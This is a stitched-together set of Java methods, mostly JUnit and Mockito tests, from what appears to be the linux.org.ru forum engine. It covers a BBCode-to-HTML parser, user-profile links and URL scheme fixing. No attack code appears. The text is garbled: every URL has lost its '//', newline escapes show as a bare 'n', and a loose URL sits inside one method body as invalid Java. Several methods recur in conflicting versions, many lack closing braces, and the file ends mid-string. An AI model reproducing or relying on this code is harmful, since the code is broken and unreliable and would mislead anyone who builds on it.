public void codeEscapeTest ( ) { Assert . assertEquals ( " <div class= \" code \" ><pre class= \" no-highlight \" ><code>&quot;code&amp;code&quot;</code></pre></div> " , lorCodeService . parseComment ( " [code] \" code&code \" [/code] " , false ) ) ; 
public void init ( ) throws Exception { maxcom = mock ( User . class ) ; JB = mock ( User . class ) ; isden = mock ( User . class ) ; when ( maxcom . isBlocked ( ) ) . thenReturn ( false ) ; when ( JB . isBlocked ( ) ) . thenReturn ( false ) ; when ( isden . isBlocked ( ) ) . thenReturn ( true ) ; userDao = mock ( UserDao . class ) ; when ( userDao . getUser ( " maxcom " ) ) . thenReturn ( maxcom ) ; when ( userDao . getUser ( " JB " ) ) . thenReturn ( JB ) ; when ( userDao . getUser ( " isden " ) ) . thenReturn ( isden ) ; when ( userDao . getUser ( " hizel " ) ) . thenThrow ( new UserNotFoundException ( " hizel " ) ) ; mainUrl = " http:127.0.0.1:8080/ " ; mainURI = new URI ( mainUrl , true , " UTF-8 " ) ; configuration = mock ( Configuration . class ) ; when ( configuration . getMainURI ( ) ) . thenReturn ( mainURI ) ; when ( configuration . getMainUrl ( ) ) . thenReturn ( mainUrl ) ; lorCodeService = new LorCodeService ( ) ; lorCodeService . userDao = userDao ; lorCodeService . configuration = configuration ; url = " http:127.0.0.1:8080/forum/talks/22464 " ; } 
public void brTest ( ) { Assert . assertEquals ( lorCodeService . parseComment ( " [br] " , false ) , " <p><br></p> " ) ; } 
public void boldTest ( ) { Assert . assertEquals ( lorCodeService . parseComment ( " [b]hello world[/b] " , false ) , " <p><b>hello world</b></p> " ) ; } 
public void italicTest ( ) { Assert . assertEquals ( lorCodeService . parseComment ( " [i]hello world[/i] " , false ) , " <p><i>hello world</i></p> " ) ; } 
public void strikeoutTest ( ) { Assert . assertEquals ( lorCodeService . parseComment ( " [s]hello world[/s] " , false ) , " <p><s>hello world</s></p> " ) ; } 
public void emphasisTest ( ) { Assert . assertEquals ( lorCodeService . parseComment ( " [strong]hello world[/strong] " , false ) , " <p><strong>hello world</strong></p> " ) ; } 
public void quoteCleanTest ( ) { Assert . assertEquals ( lorCodeService . parseComment ( " [quote][/quote] " , false ) , " " ) ; } 
public void urlTest ( ) { Assert . assertEquals ( lorCodeService . parseComment ( " [url]http:linux.org.ru[/url] " , false ) , " <p><a href= \" http:linux.org.ru \" >http:linux.org.ru</a></p> " ) ; } 
public void urlParamTest ( ) { Assert . assertEquals ( lorCodeService . parseComment ( " [url=http:linux.org.ru]linux[/url] " , false ) , " <p><a href= \" http:linux.org.ru \" >linux</a></p> " ) ; } 
public void urlParamWithTagTest ( ) { Assert . assertEquals ( lorCodeService . parseComment ( " [url=http:linux.org.ru][b]l[/b]inux[/url] " , false ) , " <p><a href= \" http:linux.org.ru \" ><b>l</b>inux</a></p> " ) ; } 
public void urlParamWithTagTest2 ( ) { Assert . assertEquals ( lorCodeService . parseComment ( " [url=http:linux.org.ru][b]linux[/b][/url] " , false ) , " <p><a href= \" http:linux.org.ru \" ><b>linux</b></a></p> " ) ; } 
public void listTest ( ) { Assert . assertEquals ( lorCodeService . parseComment ( " [list][*]one[*]two[*]three[/list] " , false ) , " <ul><li>one</li><li>two</li><li>three</li></ul> " ) ; } 
public void codeTest ( ) { Assert . assertEquals ( lorCodeService . parseComment ( " [code][list][*]one[*]two[*]three[/list][/code] " , false ) , " <div class= \" code \" ><pre class= \" no-highlight \" ><code>[list][*]one[*]two[*]three[/list]</code></pre></div> " ) ; } 
public void codeCleanTest ( ) { Assert . assertEquals ( " " , lorCodeService . parseComment ( " [code][/code] " , false ) ) ; } 
public void codeKnowTest ( ) { Assert . assertEquals ( " <div class= \" code \" ><pre class= \" language-cpp \" ><code>#include &lt;stdio.h&gt;</code></pre></div> " , lorCodeService . parseComment ( " [code=cxx]#include <stdio.h>[/code] " , false ) ) ; 
public void codeUnKnowTest ( ) { Assert . assertEquals ( " <div class= \" code \" ><pre class= \" no-highlight \" ><code>#include &lt;stdio.h&gt;</code></pre></div> " , lorCodeService . parseComment ( " [code=foo]#include <stdio.h>[/code] " , false ) ) ; 
public void spacesTest ( ) { Assert . assertEquals ( " <p>some text</p><p> some again text <a href= \" http:example.com \" >example</a> example</p> " , lorCodeService . parseComment ( " some text n some again text [url=http:example.com]example[/url] example " , false ) ) ; 
public void userTest ( ) throws Exception { Assert . assertEquals ( " <p><span style= \" white-space: nowrap \" ><img src= \" /img/tuxlor.png \" ><a style= \" text-decoration: none \" href='/people/maxcom/profile'>maxcom</a></span></p> " , lorCodeService . parseComment ( " [user]maxcom[/user] " , false ) ) ; Assert . assertEquals ( " <p><span style= \" white-space: nowrap \" ><img src= \" /img/tuxlor.png \" ><s><a style= \" text-decoration: none \" href='/people/isden/profile'>isden</a></s></span></p> " , lorCodeService . parseComment ( " [user]isden[/user] " , false ) ) ; Assert . assertEquals ( " <p><s>hizel</s></p> " , lorCodeService . parseComment ( " [user]hizel[/user] " , false ) ) ; 
public void cut4Test ( ) { Assert . assertEquals ( " <div id= \" cut0 \" ><p>test</p></div><div id= \" cut1 \" ><p>test</p></div> " , lorCodeService . parseTopic ( " [cut] ntest[/cut][cut]test[/cut] " , false ) ) ; 
public void initTest ( ) throws Exception { userDao = mock ( UserDao . class ) ; user = mock ( User . class ) ; when ( user . isBlocked ( ) ) . thenReturn ( false ) ; when ( userDao . getUser ( " splinter " ) ) . thenReturn ( user ) ; lorCodeService = new LorCodeService ( ) ; lorCodeService . userDao = userDao ; } 
public void urlTest0 ( ) { Assert . assertEquals ( " <p><a href= \" http:linux.org.ru \" ><p>linux.org.ru</p></a></p> " , lorCodeService . parseComment ( " [url=http:linux.org.ru] nlinux.org.ru[/url] " , false ) ) ; Assert . assertEquals ( " <p><a href= \" http:linux.org.ru \" >http:linux.org.ru</a></p> " , lorCodeService . parseComment ( " [url] nhttp:linux.org.ru[/url] " , false ) ) ; 
public void urlTest1 ( ) { Assert . assertEquals ( " <p><a href= \" http:linux.org.ru \" >http:linux.org.ru</a></p> " , lorCodeService . parseComment ( " [url=http:linux.org.ru][/url] " , false ) ) ; 
public void splinterTest1 ( ) { http:www.linux.org.ru/forum/linux-org-ru/6448266 Assert.assertEquals(lorCodeService.parseComment("[url=http:www.fishing.org/][user]splinter[/user][/url]", false), "<p><a href=\"http:www.fishing.org/\">http:www.fishing.org/</a><span style=\"white-space: nowrap\"><img src=\"/img/tuxlor.png\"><a style=\"text-decoration: none\" href='/people/splinter/profile'>splinter</a></span></p>"); 
public List < PreparedMessage > prepareMessagesFeed ( List < Message > messages , boolean secure ) { List < PreparedMessage > pm = new ArrayList < PreparedMessage > ( messages . size ( ) ) ; for ( Message message : messages ) { PreparedMessage preparedMessage = prepareMessage ( message , messageDao . getTags ( message ) , true , null , secure ) ; pm . add ( preparedMessage ) ; } return pm ; } 
public String renderNodeXhtml ( Node node ) { if ( node . lengthChildren ( ) = = 0 ) { return " " ; } TextNode txtNode = ( TextNode ) node . getChildren ( ) . iterator ( ) . next ( ) ; String memberName = Parser . escape ( txtNode . getText ( ) ) . trim ( ) ; String result ; TagNode tagNode = ( TagNode ) node ; RootNode rootNode = tagNode . getRootNode ( ) ; ToHtmlFormatter toHtmlFormatter = rootNode . getToHtmlFormatter ( ) ; boolean secure = rootNode . isSecure ( ) ; UserDao userDao = rootNode . getUserDao ( ) ; try { if ( userDao ! = null & & toHtmlFormatter ! = null ) { User user = rootNode . getUserDao ( ) . getUser ( memberName ) ; if ( ! user . isBlocked ( ) ) { result = String . format ( " <span style= \" white-space: nowrap \" ><img src= \" /img/tuxlor.png \" ><a style= \" text-decoration: none \" href= \" %s \" >%s</a></span> " , toHtmlFormatter . memberURL ( user , secure ) , Parser . escape ( memberName ) ) ; rootNode . addReplier ( user ) ; } else { result = String . format ( " <span style= \" white-space: nowrap \" ><img src= \" /img/tuxlor.png \" ><s><a style= \" text-decoration: none \" href= \" %s \" >%s</a></s></span> " , toHtmlFormatter . memberURL ( user , secure ) , Parser . escape ( memberName ) ) ; } } else { result = Parser . escape ( memberName ) ; } } catch ( Exception ex ) { result = String . format ( " <s>%s</s> " , Parser . escape ( memberName ) ) ; } return result ; } 
public String memberURL ( User user , boolean secure ) throws URIException { URI mainUri = configuration . getMainURI ( ) ; String scheme ; if ( secure ) { scheme = " https " ; } else { scheme = " http " ; } return ( new URI ( scheme , null , mainUri . getHost ( ) , mainUri . getPort ( ) , String . format ( " /people/%s/profile " , user . getNick ( ) ) ) ) . getEscapedURIReference ( ) ; } 
public void init ( ) throws Exception { maxcom = mock ( User . class ) ; JB = mock ( User . class ) ; isden = mock ( User . class ) ; when ( maxcom . isBlocked ( ) ) . thenReturn ( false ) ; when ( JB . isBlocked ( ) ) . thenReturn ( false ) ; when ( isden . isBlocked ( ) ) . thenReturn ( true ) ; when ( maxcom . getNick ( ) ) . thenReturn ( " maxcom " ) ; when ( JB . getNick ( ) ) . thenReturn ( " JB " ) ; when ( isden . getNick ( ) ) . thenReturn ( " isden " ) ; userDao = mock ( UserDao . class ) ; when ( userDao . getUser ( " maxcom " ) ) . thenReturn ( maxcom ) ; when ( userDao . getUser ( " JB " ) ) . thenReturn ( JB ) ; when ( userDao . getUser ( " isden " ) ) . thenReturn ( isden ) ; when ( userDao . getUser ( " hizel " ) ) . thenThrow ( new UserNotFoundException ( " hizel " ) ) ; mainUrl = " http:127.0.0.1:8080/ " ; mainURI = new URI ( mainUrl , true , " UTF-8 " ) ; configuration = mock ( Configuration . class ) ; when ( configuration . getMainURI ( ) ) . thenReturn ( mainURI ) ; when ( configuration . getMainUrl ( ) ) . thenReturn ( mainUrl ) ; toHtmlFormatter = new ToHtmlFormatter ( ) ; toHtmlFormatter . setConfiguration ( configuration ) ; lorCodeService = new LorCodeService ( ) ; lorCodeService . userDao = userDao ; lorCodeService . configuration = configuration ; lorCodeService . toHtmlFormatter = toHtmlFormatter ; url = " http:127.0.0.1:8080/forum/talks/22464 " ; } 
public void userTest ( ) throws Exception { Assert . assertEquals ( " <p><span style= \" white-space: nowrap \" ><img src= \" /img/tuxlor.png \" ><a style= \" text-decoration: none \" href= \" http:127.0.0.1:8080/people/maxcom/profile \" >maxcom</a></span></p> " , lorCodeService . parseComment ( " [user]maxcom[/user] " , false ) ) ; Assert . assertEquals ( " <p><span style= \" white-space: nowrap \" ><img src= \" /img/tuxlor.png \" ><s><a style= \" text-decoration: none \" href= \" http:127.0.0.1:8080/people/isden/profile \" >isden</a></s></span></p> " , lorCodeService . parseComment ( " [user]isden[/user] " , false ) ) ; Assert . assertEquals ( " <p><s>hizel</s></p> " , lorCodeService . parseComment ( " [user]hizel[/user] " , false ) ) ; 
public void parserResultTest ( ) throws Exception { String msg = " [user]hizel[/user][user]JB[/user][user]maxcom[/user] " ; Set < User > replier = lorCodeService . getReplierFromMessage ( msg ) ; String html = lorCodeService . parseComment ( msg , true ) ; Assert . assertTrue ( replier . contains ( maxcom ) ) ; Assert . assertTrue ( replier . contains ( JB ) ) ; Assert . assertFalse ( replier . contains ( isden ) ) ; Assert . assertEquals ( " <p><s>hizel</s><span style= \" white-space: nowrap \" ><img src= \" /img/tuxlor.png \" ><a style= \" text-decoration: none \" href= \" https:127.0.0.1:8080/people/JB/profile \" >JB</a></span><span style= \" white-space: nowrap \" ><img src= \" /img/tuxlor.png \" ><a style= \" text-decoration: none \" href= \" https:127.0.0.1:8080/people/maxcom/profile \" >maxcom</a></span></p> " , html ) ; } 
public void initTest ( ) throws Exception { userDao = mock ( UserDao . class ) ; user = mock ( User . class ) ; when ( user . isBlocked ( ) ) . thenReturn ( false ) ; when ( user . getNick ( ) ) . thenReturn ( " splinter " ) ; when ( userDao . getUser ( " splinter " ) ) . thenReturn ( user ) ; mainUrl = " http:127.0.0.1:8080/ " ; mainURI = new URI ( mainUrl , true , " UTF-8 " ) ; configuration = mock ( Configuration . class ) ; when ( configuration . getMainURI ( ) ) . thenReturn ( mainURI ) ; when ( configuration . getMainUrl ( ) ) . thenReturn ( mainUrl ) ; toHtmlFormatter = new ToHtmlFormatter ( ) ; toHtmlFormatter . setConfiguration ( configuration ) ; lorCodeService = new LorCodeService ( ) ; lorCodeService . userDao = userDao ; lorCodeService . configuration = configuration ; lorCodeService . toHtmlFormatter = toHtmlFormatter ; } 
public void splinterTest1 ( ) { http:www.linux.org.ru/forum/linux-org-ru/6448266 Assert.assertEquals(lorCodeService.parseComment("[url=http:www.fishing.org/][user]splinter[/user][/url]", false), "<p><a href=\"http:www.fishing.org/\">http:www.fishing.org/</a><span style=\"white-space: nowrap\"><img src=\"/img/tuxlor.png\"><a style=\"text-decoration: none\" href=\"http:127.0.0.1:8080/people/splinter/profile\">splinter</a></span></p>"); 
public String toUnEscapedString ( ) { try { return lorURI . getURIReference ( ) ; 
public String formatUrlBody ( int maxLength ) throws URIException { String all = lorURI . getURIReference ( ) ; String scheme = lorURI . getScheme ( ) ; String uriWithoutScheme = all . substring ( scheme . length ( ) + 3 ) ; if ( uriWithoutScheme . length ( ) < maxLength ) { return uriWithoutScheme ; 
public String fixScheme ( boolean secure ) throws URIException { if ( ! isTrueLorUrl ) { return toString ( ) ; } String scheme ; if ( secure ) { scheme = " https " ; } else { scheme = " http " ; } String host = lorURI . getHost ( ) ; int port = lorURI . getPort ( ) ; String path = lorURI . getPath ( ) ; String query = lorURI . getQuery ( ) ; String fragment = lorURI . getFragment ( ) ; URI fixUri = new URI ( scheme , null , host , port , path , query , fragment ) ; return fixUri . getEscapedURI ( ) ; } 
public void init ( ) throws Exception { mainURI = new URI ( " http:www.linux.org.ru/ " , true , " UTF-8 " ) ; configuration = mock ( Configuration . class ) ; when ( configuration . getMainURI ( ) ) . thenReturn ( mainURI ) ; toHtmlFormatter = new ToHtmlFormatter ( ) ; toHtmlFormatter . setConfiguration ( configuration ) ; toHtmlFormatter20 = new ToHtmlFormatter ( ) ; toHtmlFormatter20 . setConfiguration ( configuration ) ; toHtmlFormatter20 . setMaxLength ( 20 ) ; toLorCodeTexFormatter = new ToLorCodeTexFormatter ( ) ; toLorCodeFormatter = new ToLorCodeFormatter ( ) ; } 
public void initTest ( ) throws Exception { mainURI = new URI ( " http:127.0.0.1:8080/ " , true , " UTF-8 " ) ; mainLORURI = new URI ( " http:www.linux.org.ru/ " , true , " UTF-8 " ) ; messageDao = mock ( MessageDao . class ) ; message1 = mock ( Message . class ) ; group1 = mock ( Group . class ) ; message2 = mock ( Message . class ) ; group2 = mock ( Group . class ) ; message3 = mock ( Message . class ) ; group3 = mock ( Group . class ) ; message12 = mock ( Message . class ) ; group12 = mock ( Group . class ) ; when ( group1 . getUrl ( ) ) . thenReturn ( " /news/debian/ " ) ; when ( group2 . getUrl ( ) ) . thenReturn ( " /forum/talks/ " ) ; when ( group3 . getUrl ( ) ) . thenReturn ( " /forum/general/ " ) ; when ( group12 . getUrl ( ) ) . thenReturn ( " /forum/security/ " ) ; when ( messageDao . getGroup ( message1 ) ) . thenReturn ( group1 ) ; when ( messageDao . getGroup ( message2 ) ) . thenReturn ( group2 ) ; when ( messageDao . getGroup ( message3 ) ) . thenReturn ( group3 ) ; when ( messageDao . getGroup ( message12 ) ) . thenReturn ( group12 ) ; when ( messageDao . getById ( 6753486 ) ) . thenReturn ( message1 ) ; when ( messageDao . getById ( 6893165 ) ) . thenReturn ( message2 ) ; when ( messageDao . getById ( 6890857 ) ) . thenReturn ( message3 ) ; when ( messageDao . getById ( 1948661 ) ) . thenReturn ( message12 ) ; } 
public String fixScheme ( boolean secure ) throws URIException { if ( ! isTrueLorUrl ) { return toString ( ) ; } String scheme ; if ( secure ) { scheme = " https " ; } else { scheme = " http " ; } String host = lorURI . getHost ( ) ; int port = lorURI . getPort ( ) ; String path = lorURI . getPath ( ) ; String query = lorURI . getQuery ( ) ; String fragment = lorURI . getFragment ( ) ; URI fixUri = new URI ( scheme , null , host , port , path , query , fragment ) ; return fixUri . getEscapedURIReference ( ) ; } 
public void test1 ( ) throws Exception { LorURI lorURI = new LorURI ( mainURI , url1 ) ; assertEquals ( 6753486 , lorURI . getMessageId ( ) ) ; assertEquals ( 6753612 , lorURI . getCommentId ( ) ) ; assertTrue ( lorURI . isTrueLorUrl ( ) ) ; assertTrue ( lorURI . isMessageUrl ( ) ) ; assertTrue ( lorURI . isCommentUrl ( ) ) ; assertEquals ( " http:127.0.0.1:8080/news/debian/6753486#comment-6753612 " , lorURI . fixScheme ( false ) ) ; assertEquals ( " https:127.0.0.1:8080/news/debian/6753486#comment-6753612 " , lorURI . fixScheme ( true ) ) ; assertEquals ( " http:127.0.0.1:8080/news/debian/6753486?cid=6753612 " , lorURI . formatJump ( messageDao , false ) ) ; assertEquals ( " https:127.0.0.1:8080/news/debian/6753486?cid=6753612 " , lorURI . formatJump ( messageDao , true ) ) ; } 
public void test2 ( ) throws Exception { LorURI lorURI = new LorURI ( mainURI , url2 ) ; assertEquals ( 6893165 , lorURI . getMessageId ( ) ) ; assertEquals ( 0 , lorURI . getCommentId ( ) ) ; assertTrue ( lorURI . isTrueLorUrl ( ) ) ; assertTrue ( lorURI . isMessageUrl ( ) ) ; assertTrue ( ! lorURI . isCommentUrl ( ) ) ; assertEquals ( " http:127.0.0.1:8080/forum/talks/6893165?lastmod=1319027964738 " , lorURI . fixScheme ( false ) ) ; assertEquals ( " https:127.0.0.1:8080/forum/talks/6893165?lastmod=1319027964738 " , lorURI . fixScheme ( true ) ) ; assertEquals ( " http:127.0.0.1:8080/forum/talks/6893165 " , lorURI . formatJump ( messageDao , false ) ) ; assertEquals ( " https:127.0.0.1:8080/forum/talks/6893165 " , lorURI . formatJump ( messageDao , true ) ) ; } 
public void test3 ( ) throws Exception { LorURI lorURI = new LorURI ( mainURI , url3 ) ; assertEquals ( 6890857 , lorURI . getMessageId ( ) ) ; assertEquals ( 6892917 , lorURI . getCommentId ( ) ) ; assertTrue ( lorURI . isTrueLorUrl ( ) ) ; assertTrue ( lorURI . isMessageUrl ( ) ) ; assertTrue ( lorURI . isCommentUrl ( ) ) ; assertEquals ( " http:127.0.0.1:8080/forum/general/6890857/page2?lastmod=1319022386177#comment-6892917 " , lorURI . fixScheme ( false ) ) ; assertEquals ( " https:127.0.0.1:8080/forum/general/6890857/page2?lastmod=1319022386177#comment-6892917 " , lorURI . fixScheme ( true ) ) ; assertEquals ( " http:127.0.0.1:8080/forum/general/6890857?cid=6892917 " , lorURI . formatJump ( messageDao , false ) ) ; assertEquals ( " https:127.0.0.1:8080/forum/general/6890857?cid=6892917 " , lorURI . formatJump ( messageDao , true ) ) ; } 
public void test1 ( ) throws Exception { LorURI lorURI = new LorURI ( mainURI , url1 ) ; assertTrue ( lorURI . isTrueLorUrl ( ) ) ; assertTrue ( lorURI . isMessageUrl ( ) ) ; assertTrue ( lorURI . isCommentUrl ( ) ) ; assertEquals ( 6753486 , lorURI . getMessageId ( ) ) ; assertEquals ( 6753612 , lorURI . getCommentId ( ) ) ; assertEquals ( " http:127.0.0.1:8080/news/debian/6753486#comment-6753612 " , lorURI . fixScheme ( false ) ) ; assertEquals ( " https:127.0.0.1:8080/news/debian/6753486#comment-6753612 " , lorURI . fixScheme ( true ) ) ; assertEquals ( " http:127.0.0.1:8080/news/debian/6753486?cid=6753612 " , lorURI . formatJump ( messageDao , false ) ) ; assertEquals ( " https:127.0.0.1:8080/news/debian/6753486?cid=6753612 " , lorURI . formatJump ( messageDao , true ) ) ; } 
public void test1n ( ) throws Exception { LorURI lorURI = new LorURI ( mainURI , url1n ) ; assertTrue ( lorURI . isTrueLorUrl ( ) ) ; assertTrue ( lorURI . isMessageUrl ( ) ) ; assertTrue ( lorURI . isCommentUrl ( ) ) ; assertEquals ( 6753486 , lorURI . getMessageId ( ) ) ; assertEquals ( 6753612 , lorURI . getCommentId ( ) ) ; assertEquals ( " http:127.0.0.1:8080/news/debian/6753486?cid=6753612 " , lorURI . fixScheme ( false ) ) ; assertEquals ( " https:127.0.0.1:8080/news/debian/6753486?cid=6753612 " , lorURI . fixScheme ( true ) ) ; assertEquals ( " http:127.0.0.1:8080/news/debian/6753486?cid=6753612 " , lorURI . formatJump ( messageDao , false ) ) ; assertEquals ( " https:127.0.0.1:8080/news/debian/6753486?cid=6753612 " , lorURI . formatJump ( messageDao , true ) ) ; } 
public String fixScheme ( boolean secure ) throws URIException { if ( ! isTrueLorUrl ) { return toString ( ) ; } String host = lorURI . getHost ( ) ; int port = lorURI . getPort ( ) ; String path = lorURI . getPath ( ) ; String query = lorURI . getQuery ( ) ; String fragment = lorURI . getFragment ( ) ; if ( ! secure ) { return ( new HttpURL ( null , host , port , path , query , fragment ) ) . getEscapedURIReference ( ) ; 
public void test13 ( ) throws Exception { String url13_1 = " http:www.linux.org.ru/view-news.jsp?tag=c%2B%2B " ; String url13_2 = " http:www.linux.org.ru/view-news.jsp?tag=c++ " ; String url13_3 = " http:www.linux.org.ru/view-news.jsp?tag=c+c " ; LorURI lorURI1 = new LorURI ( mainLORURI , url13_1 ) ; LorURI lorURI2 = new LorURI ( mainLORURI , url13_2 ) ; LorURI lorURI3 = new LorURI ( mainLORURI , url13_3 ) ; assertEquals ( " https:www.linux.org.ru/view-news.jsp?tag=c++ " , lorURI1 . fixScheme ( true ) ) ; assertEquals ( " http:www.linux.org.ru/view-news.jsp?tag=c++ " , lorURI1 . fixScheme ( false ) ) ; assertEquals ( " https:www.linux.org.ru/view-news.jsp?tag=c%20%20 " , lorURI2 . fixScheme ( true ) ) ; assertEquals ( " http:www.linux.org.ru/view-news.jsp?tag=c%20%20 " , lorURI2 . fixScheme ( false ) ) ; assertEquals ( " http:www.linux.org.ru/view-news.jsp?tag=c%20c " , lorURI3 . fixScheme ( false ) ) ; assertEquals ( " https:www.linux.org.ru/view-news.jsp?tag=c%20c " , lorURI3 . fixScheme ( true ) ) ; } 
public void test14 ( ) throws Exception { String url14_1 = " https:www.linux.org.ru/jump-message.jsp?msgid=6890857&cid=6892917 " ; String url14_2 = " https:127.0.0.1:8080/jump-message.jsp?msgid=6890857&cid=6892917 " ; LorURI lorURI1 = new LorURI ( mainLORURI , url14_1 ) ; LorURI lorURI2 = new LorURI ( mainURI , url14_2 ) ; assertEquals ( 6890857 , lorURI1 . getMessageId ( ) ) ; assertEquals ( 6892917 , lorURI1 . getCommentId ( ) ) ; assertTrue ( lorURI1 . isTrueLorUrl ( ) ) ; assertTrue ( lorURI1 . isMessageUrl ( ) ) ; assertTrue ( lorURI1 . isCommentUrl ( ) ) ; assertEquals ( " http:www.linux.org.ru/jump-message.jsp?msgid=6890857&cid=6892917 " , lorURI1 . fixScheme ( false ) ) ; assertEquals ( " https:www.linux.org.ru/jump-message.jsp?msgid=6890857&cid=6892917 " , lorURI1 . fixScheme ( true ) ) ; assertEquals ( " http:www.linux.org.ru/forum/general/6890857?cid=6892917 " , lorURI1 . formatJump ( messageDao , false ) ) ; assertEquals ( " https:www.linux.org.ru/forum/general/6890857?cid=6892917 " , lorURI1 . formatJump ( messageDao , true ) ) ; assertEquals ( 6890857 , lorURI2 . getMessageId ( ) ) ; assertEquals ( 6892917 , lorURI2 . getCommentId ( ) ) ; assertTrue ( lorURI2 . isTrueLorUrl ( ) ) ; assertTrue ( lorURI2 . isMessageUrl ( ) ) ; assertTrue ( lorURI2 . isCommentUrl ( ) ) ; assertEquals ( " http:127.0.0.1:8080/jump-message.jsp?msgid=6890857&cid=6892917 " , lorURI2 . fixScheme ( false ) ) ; assertEquals ( " https:127.0.0.1:8080/jump-message.jsp?msgid=6890857&cid=6892917 " , lorURI2 . fixScheme ( true ) ) ; assertEquals ( " http:127.0.0.1:8080/forum/general/6890857?cid=6892917 " , lorURI2 . formatJump ( messageDao , false ) ) ; assertEquals ( " https:127.0.0.1:8080/forum/general/6890857?cid=6892917 " , lorURI2 . formatJump ( messageDao , true ) ) ; } 
public void test14 ( ) throws Exception { String url14_1 = " https:www.linux.org.ru/jump-message.jsp?msgid=6890857&amp;cid=6892917 " ; String url14_2 = " https:127.0.0.1:8080/jump-message.jsp?msgid=6890857&amp;cid=6892917 " ; LorURI lorURI1 = new LorURI ( mainLORURI , url14_1 ) ; LorURI lorURI2 = new LorURI ( mainURI , url14_2 ) ; assertEquals ( 6890857 , lorURI1 . getMessageId ( ) ) ; assertEquals ( 6892917 , lorURI1 . getCommentId ( ) ) ; assertTrue ( lorURI1 . isTrueLorUrl ( ) ) ; assertTrue ( lorURI1 . isMessageUrl ( ) ) ; assertTrue ( lorURI1 . isCommentUrl ( ) ) ; assertEquals ( " http:www.linux.org.ru/jump-message.jsp?msgid=6890857&amp;cid=6892917 " , lorURI1 . fixScheme ( false ) ) ; assertEquals ( " https:www.linux.org.ru/jump-message.jsp?msgid=6890857&amp;cid=6892917 " , lorURI1 . fixScheme ( true ) ) ; assertEquals ( " http:www.linux.org.ru/forum/general/6890857?cid=6892917 " , lorURI1 . formatJump ( messageDao , false ) ) ; assertEquals ( " https:www.linux.org.ru/forum/general/6890857?cid=6892917 " , lorURI1 . formatJump ( messageDao , true ) ) ; assertEquals ( 6890857 , lorURI2 . getMessageId ( ) ) ; assertEquals ( 6892917 , lorURI2 . getCommentId ( ) ) ; assertTrue ( lorURI2 . isTrueLorUrl ( ) ) ; assertTrue ( lorURI2 . isMessageUrl ( ) ) ; assertTrue ( lorURI2 . isCommentUrl ( ) ) ; assertEquals ( " http:127.0.0.1:8080/jump-message.jsp?msgid=6890857&amp;cid=6892917 " , lorURI2 . fixScheme ( false ) ) ; assertEquals ( " https:127.0.0.1:8080/jump-message.jsp?msgid=6890857&amp;cid=6892917 " , lorURI2 . fixScheme ( true ) ) ; assertEquals ( " http:127.0.0.1:8080/forum/general/6890857?cid=6892917 " , lorURI2 . formatJump ( messageDao , false ) ) ; assertEquals ( " https:127.0.0.1:8080/forum/general/6890857?cid=6892917 " , lorURI2 . formatJump ( messageDao , true ) ) ; } 
public Integer get ( ) { return pollDao . getCountUsers ( poll ) ; } 
public ModelAndView moveTopicFormForum ( ServletRequest request , @RequestParam int msgid ) throws Exception { Template tmpl = Template . getTemplate ( request ) ; if ( ! tmpl . isModeratorSession ( ) ) { throw new AccessViolationException ( " Not authorized " ) ; } ModelAndView mv = new ModelAndView ( " mtn " ) ; Message message = messageDao . getById ( msgid ) ; mv . getModel ( ) . put ( " message " , message ) ; Section section = sectionDao . getSection ( Section . SECTION_FORUM ) ; mv . getModel ( ) . put ( " groups " , groupDao . getGroups ( section ) ) ; return mv ; } 
public void initTest ( ) throws Exception { mainURI = new URI ( " http:127.0.0.1:8080/ " , true , " UTF-8 " ) ; mainLORURI = new URI ( " http:www.linux.org.ru/ " , true , " UTF-8 " ) ; messageDao = mock ( MessageDao . class ) ; message1 = mock ( Message . class ) ; group1 = mock ( Group . class ) ; message2 = mock ( Message . class ) ; group2 = mock ( Group . class ) ; message3 = mock ( Message . class ) ; group3 = mock ( Group . class ) ; message12 = mock ( Message . class ) ; group12 = mock ( Group . class ) ; message15 = mock ( Message . class ) ; group15 = mock ( Group . class ) ; when ( group1 . getUrl ( ) ) . thenReturn ( " /news/debian/ " ) ; when ( group2 . getUrl ( ) ) . thenReturn ( " /forum/talks/ " ) ; when ( group3 . getUrl ( ) ) . thenReturn ( " /forum/general/ " ) ; when ( group12 . getUrl ( ) ) . thenReturn ( " /forum/security/ " ) ; when ( group15 . getUrl ( ) ) . thenReturn ( " /forum/linux-org-ru/ " ) ; when ( messageDao . getGroup ( message1 ) ) . thenReturn ( group1 ) ; when ( messageDao . getGroup ( message2 ) ) . thenReturn ( group2 ) ; when ( messageDao . getGroup ( message3 ) ) . thenReturn ( group3 ) ; when ( messageDao . getGroup ( message12 ) ) . thenReturn ( group12 ) ; when ( messageDao . getGroup ( message15 ) ) . thenReturn ( group15 ) ; when ( messageDao . getById ( 6753486 ) ) . thenReturn ( message1 ) ; when ( messageDao . getById ( 6893165 ) ) . thenReturn ( message2 ) ; when ( messageDao . getById ( 6890857 ) ) . thenReturn ( message3 ) ; when ( messageDao . getById ( 1948661 ) ) . thenReturn ( message12 ) ; when ( messageDao . getById ( 6944260 ) ) . thenReturn ( message15 ) ; } 
public void test15 ( ) throws Exception { String url15_1 = " https:www.linux.org.ru/forum/linux-org-ru/6944260/page4?lastmod=1320084656912#comment-6944831 " ; String url15_2 = " https:127.0.0.1:8080/forum/linux-org-ru/6944260/page4?lastmod=1320084656912#comment-6944831 " ; LorURI lorURI1 = new LorURI ( mainLORURI , url15_1 ) ; LorURI lorURI2 = new LorURI ( mainURI , url15_2 ) ; assertEquals ( 6944260 , lorURI1 . getMessageId ( ) ) ; assertEquals ( 6944831 , lorURI1 . getCommentId ( ) ) ; assertTrue ( lorURI1 . isTrueLorUrl ( ) ) ; assertTrue ( lorURI1 . isMessageUrl ( ) ) ; assertTrue ( lorURI1 . isCommentUrl ( ) ) ; assertEquals ( " http:www.linux.org.ru/forum/linux-org-ru/6944260/page4?lastmod=1320084656912#comment-6944831 " , lorURI1 . fixScheme ( false ) ) ; assertEquals ( " https:www.linux.org.ru/forum/linux-org-ru/6944260/page4?lastmod=1320084656912#comment-6944831 " , lorURI1 . fixScheme ( true ) ) ; assertEquals ( " http:www.linux.org.ru/forum/linux-org-ru/6944260?cid=6944831 " , lorURI1 . formatJump ( messageDao , false ) ) ; assertEquals ( " https:www.linux.org.ru/forum/linux-org-ru/6944260?cid=6944831 " , lorURI1 . formatJump ( messageDao , true ) ) ; assertEquals ( 6944260 , lorURI2 . getMessageId ( ) ) ; assertEquals ( 6944831 , lorURI2 . getCommentId ( ) ) ; assertTrue ( lorURI2 . isTrueLorUrl ( ) ) ; assertTrue ( lorURI2 . isMessageUrl ( ) ) ; assertTrue ( lorURI2 . isCommentUrl ( ) ) ; assertEquals ( " 